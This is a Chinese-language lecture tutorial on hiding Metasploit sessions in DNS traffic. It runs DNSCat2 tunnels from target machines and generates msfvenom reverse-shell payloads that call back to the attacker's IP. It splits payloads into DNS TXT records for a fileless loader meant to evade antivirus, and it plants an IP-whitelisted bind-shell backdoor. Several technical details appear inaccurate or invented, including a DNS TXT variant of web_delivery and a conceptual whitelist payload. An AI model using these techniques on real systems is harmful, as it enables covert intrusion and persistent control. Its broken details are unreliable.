# 课程 P1：39 🔐 突破多层防护，控制你的Shell - Metasploit会话结合DNS协议

![](img/b6f27f2fddda555cf33048d1d561b2a5_1.png)

![](img/b6f27f2fddda555cf33048d1d561b2a5_3.png)

![](img/b6f27f2fddda555cf33048d1d561b2a5_5.png)

在本节课中，我们将学习如何利用DNS协议来隐蔽地建立和控制Metasploit会话，从而绕过防火墙等安全防护措施。课程将分为三个主要部分：DNS隧道工具DNSCat2的使用、通过DNS TXT记录传输Payload，以及如何限制会话连接来源以增强隐蔽性。

---

![](img/b6f27f2fddda555cf33048d1d561b2a5_7.png)

![](img/b6f27f2fddda555cf33048d1d561b2a5_9.png)

![](img/b6f27f2fddda555cf33048d1d561b2a5_10.png)

## 概述

防火墙通常不会严格限制DNS流量，这为隐蔽通信提供了机会。本节课将介绍如何将Metasploit会话的流量封装在DNS协议中，实现突破网络防护、控制目标主机的目的。我们将使用DNSCat2工具，并讲解通过DNS TXT记录传递Payload的方法。

![](img/b6f27f2fddda555cf33048d1d561b2a5_12.png)

---

## 第一部分：DNSCat2工具介绍与使用

![](img/b6f27f2fddda555cf33048d1d561b2a5_14.png)

![](img/b6f27f2fddda555cf33048d1d561b2a5_15.png)

![](img/b6f27f2fddda555cf33048d1d561b2a5_17.png)

![](img/b6f27f2fddda555cf33048d1d561b2a5_19.png)

上一节我们概述了利用DNS协议进行隐蔽通信的思路。本节中，我们来看看实现这一目标的核心工具——DNSCat2。

DNSCat2是一款使用Ruby语言编写的工具，它能够将正常的TCP流量转换为DNS查询和响应，从而建立一个隐蔽的命令与控制（C2）通道。由于许多防火墙不会深度检测或限制DNS流量，这使得该工具能有效绕过防护。

### 安装DNSCat2

![](img/b6f27f2fddda555cf33048d1d561b2a5_21.png)

![](img/b6f27f2fddda555cf33048d1d561b2a5_23.png)

以下是安装DNSCat2的步骤，建议在Kali Linux或Ubuntu系统上进行。

![](img/b6f27f2fddda555cf33048d1d561b2a5_25.png)

1.  **系统准备**：首先，确保系统已更新，并安装必要的组件。同时，需要安装Ruby（版本2.3或以上）和Ruby的包管理工具Bundler（简称`bundler`）。
2.  **修改软件源**：由于网络环境原因，建议将RubyGems的源修改为淘宝镜像，以加速依赖包的下载。修改根目录下`server`文件夹中的`Gemfile`文件。
    ```bash
    # 将源地址修改为
    source ‘https://gems.ruby-china.com/'
    ```
3.  **安装依赖**：使用`bundler install`命令安装所有依赖。**请注意，务必使用`root`权限运行此命令**，否则可能因权限不足导致无法监听端口等问题。

![](img/b6f27f2fddda555cf33048d1d561b2a5_27.png)

![](img/b6f27f2fddda555cf33048d1d561b2a5_29.png)

### 建立DNS隧道会话

安装完成后，即可使用DNSCat2建立隧道。

![](img/b6f27f2fddda555cf33048d1d561b2a5_31.png)

1.  **启动服务端**：在DNSCat2的`server`目录下，运行以下命令启动服务端监听。
    ```bash
    ruby dnscat2.rb
    ```
    启动后，工具会显示一个客户端连接模板，其中包含需要指定的DNS服务器地址、端口和预共享密钥（PSK）。PSK用于加密通信流量，增强隐蔽性。
    ```bash
    # 示例模板
    dnscat2-client --dns-server=<YOUR_IP> --port=53 --secret=<YOUR_PSK>
    ```
2.  **运行客户端**：在目标机器上运行编译好的客户端程序（支持Windows/Linux），并填入正确的服务端IP、端口和PSK。连接成功后，服务端会接收到新会话。
3.  **管理会话**：DNSCat2的控制台操作与Metasploit类似。以下是常用命令：
    *   使用`sessions`或`sessions -l`列出所有会话。
    *   使用`session -i <ID>`进入指定会话。
    *   在会话内，可以执行命令、上传/下载文件、进行端口转发等操作。
    *   使用`Ctrl+Z`将会话置于后台，而不是`Ctrl+C`直接终止。

![](img/b6f27f2fddda555cf33048d1d561b2a5_33.png)

**核心概念**：DNSCat2通过DNS协议封装数据。其优点是隐蔽性强，缺点是每次传输的数据包较小，不适合传输大文件。

---

![](img/b6f27f2fddda555cf33048d1d561b2a5_35.png)

![](img/b6f27f2fddda555cf33048d1d561b2a5_37.png)

![](img/b6f27f2fddda555cf33048d1d561b2a5_39.png)

## 第二部分：通过DNS TXT记录传输Payload

![](img/b6f27f2fddda555cf33048d1d561b2a5_41.png)

![](img/b6f27f2fddda555cf33048d1d561b2a5_43.png)

![](img/b6f27f2fddda555cf33048d1d561b2a5_45.png)

上一节我们介绍了使用专用工具建立DNS隧道。本节中，我们来看看另一种更轻量级的方法——直接通过DNS系统的TXT记录来传递Payload。

![](img/b6f27f2fddda555cf33048d1d561b2a5_47.png)

![](img/b6f27f2fddda555cf33048d1d561b2a5_49.png)

这种方法的核心思想是：将Payload代码分割成若干段，分别存放在一个域名的多个子域名（如`a.domain.com`, `b.domain.com`）的TXT记录值中。然后在目标机器上运行一个特殊的加载程序，该程序会依次查询这些TXT记录，将值拼接起来，并在内存中执行，从而获得一个反向Shell会话。

![](img/b6f27f2fddda555cf33048d1d561b2a5_51.png)

### 操作步骤

![](img/b6f27f2fddda555cf33048d1d561b2a5_53.png)

以下是实现此方法的具体步骤：

![](img/b6f27f2fddda555cf33048d1d561b2a5_55.png)

1.  **生成Payload**：使用`msfvenom`生成一个反向Shell的Payload（例如`windows/x64/meterpreter/reverse_tcp`）。
    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f raw > payload.bin
    ```
2.  **分割Payload**：由于DNS TXT记录有长度限制（通常为255字节），需要将生成的Payload文件进行切割。可以编写脚本（如Ruby脚本）将其均匀分割。
    ```ruby
    # 示例思路：读取payload.bin，按255字节分段
    data = File.binread(‘payload.bin’)
    chunks = data.scan(/.{1,255}/m)
    ```
3.  **配置DNS记录**：在你的域名管理平台中，为子域名`a`、`b`、`c`、`d`等添加TXT记录，并将分割后的Payload片段依次填入对应的记录值中。
4.  **生成并执行加载器**：Metasploit框架中提供了一个专门的模块（`exploit/multi/script/web_delivery`的DNS TXT变体）来生成加载器。该加载器是一个PowerShell或VBS脚本，其功能就是自动查询上述TXT记录、拼接并执行Payload。
    ```bash
    use exploit/multi/script/web_delivery
    set target 2 # 例如，选择Powershell目标
    set payload windows/x64/meterpreter/reverse_tcp
    set LHOST <YOUR_IP>
    set LPORT 4444
    set SRVHOST <YOUR_IP>
    set URIPATH /
    exploit
    ```
    运行后，会生成一个一行命令。在目标机器上执行此命令，即可触发整个过程。
5.  **接收会话**：在Metasploit中设置好对应的监听器（`exploit/multi/handler`），当目标机器执行加载器并成功获取Payload后，就会建立反向连接，你便能获得一个Meterpreter会话。

![](img/b6f27f2fddda555cf33048d1d561b2a5_57.png)

![](img/b6f27f2fddda555cf33048d1d561b2a5_59.png)

![](img/b6f27f2fddda555cf33048d1d561b2a5_61.png)

![](img/b6f27f2fddda555cf33048d1d561b2a5_63.png)

**核心概念**：此方法实现了“无文件”攻击，Payload仅存在于内存和DNS查询响应中，极大降低了被传统杀毒软件发现的概率。同时，通过更新DNS记录即可快速切换控制端IP，便于持久化控制。

![](img/b6f27f2fddda555cf33048d1d561b2a5_65.png)

![](img/b6f27f2fddda555cf33048d1d561b2a5_67.png)

![](img/b6f27f2fddda555cf33048d1d561b2a5_69.png)

---

## 第三部分：限制会话连接来源（IP白名单）

上一节我们学习了两种建立隐蔽会话的方法。本节中，我们来看看如何加固这些会话，防止被他人意外或恶意连接。

![](img/b6f27f2fddda555cf33048d1d561b2a5_71.png)

![](img/b6f27f2fddda555cf33048d1d561b2a5_73.png)

当我们获得一个正向连接的Shell（即目标机器开放了一个端口等待我们连接）时，任何知道该IP和端口的人都可以尝试连接。为了安全，我们可以限制只允许特定的IP地址（即我们自己的控制端）进行连接。

![](img/b6f27f2fddda555cf33048d1d561b2a5_75.png)

### 实现方法

![](img/b6f27f2fddda555cf33048d1d561b2a5_77.png)

![](img/b6f27f2fddda555cf33048d1d561b2a5_79.png)

Metasploit的Payload本身支持此功能。在生成Payload时，可以指定`ReverseAllowProxy`和`ReverseListenerBindAddress`等高级参数，但更直接的方法是使用具有IP白名单功能的Payload变体。

1.  **生成带IP限制的Payload**：某些自定义的或经过修改的Payload模块允许在生成时设置允许连接的IP地址。
    ```bash
    # 这是一个概念性示例，具体参数取决于所用模块
    msfvenom -p windows/x64/meterpreter/bind_tcp_whitelist RHOST=<ALLOWED_IP> LPORT=4446 -f exe -o whitelist_shell.exe
    ```
2.  **执行与验证**：将此Payload在目标机器上运行，它会在指定端口（如4446）开启监听，但只会接受来自`<ALLOWED_IP>`的连接请求。其他IP地址的连接尝试都会被拒绝。
3.  **连接会话**：从白名单IP所属的机器上，使用Metasploit的`exploit/multi/handler`模块，配置对应的Payload和端口，即可成功连接会话。

**核心概念**：通过IP白名单机制，可以确保即使Shell的端口意外暴露，控制权也不会轻易丢失，增加了后门的隐蔽性和安全性。

---

## 总结与问答环节摘要

本节课我们一起学习了三种结合DNS协议或增强隐蔽性的Metasploit高级技巧：
1.  使用**DNSCat2**建立完整的DNS隧道，实现全流量伪装。
2.  利用**DNS TXT记录**分片传输Payload，实现无文件攻击和快速切换控制端。
3.  为正向Shell设置**IP白名单**，防止未授权连接。

在问答环节，讲师对常见问题进行了解答：
*   **DNS隧道的稳定性**取决于所使用的公共DNS服务器的质量和网络状况。
*   **传输速度**较慢，不适合传输大文件或加载大型模块。
*   **隐蔽性**相对较高，但异常的DNS查询频率仍可能被细心的管理员发现。
*   **DNS TXT记录**有255字节的长度限制，其他DNS记录类型也可用于传输，但各有特点。

---

**福利环节**：恭喜两位幸运观众获得《Metasploit渗透测试指南》修订版。

![](img/b6f27f2fddda555cf33048d1d561b2a5_81.png)

![](img/b6f27f2fddda555cf33048d1d561b2a5_83.png)

感谢大家的参与，我们下期再见。